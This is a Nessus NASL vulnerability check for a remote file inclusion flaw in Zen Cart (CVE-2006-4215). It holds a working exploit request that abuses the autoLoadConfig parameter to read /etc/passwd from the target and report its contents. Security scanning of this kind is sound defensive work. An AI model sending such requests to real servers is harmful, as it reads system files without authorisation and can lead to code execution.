#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(22234);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-4215");
  script_bugtraq_id(19543);
  script_xref(name:"OSVDB", value:"28149");

  script_name(english:"Zen Cart autoload_func.php autoLoadConfig Array Remote File Inclusion");
  script_summary(english:"Tries to read a local file with Zen Cart");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The version of Zen Cart installed on the remote host fails to sanitize
input to the 'autoLoadConfig' array parameter before using it in
'includes/autoload_func.php' to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00109-08152006" );
 script_set_attribute(attribute:"see_also", value:"http://www.zen-cart.com/forum/showthread.php?t=43579" );
 script_set_attribute(attribute:"solution", value:
"Apply the security patches listed in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("zencart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/zencart"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  u = string(
      dir, "/index.php?",
      "autoLoadConfig[999][0][autoType]=include&",
      "autoLoadConfig[999][0][loadFile]=", file
    );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<!DOCTYPE");

    if (contents && report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
}
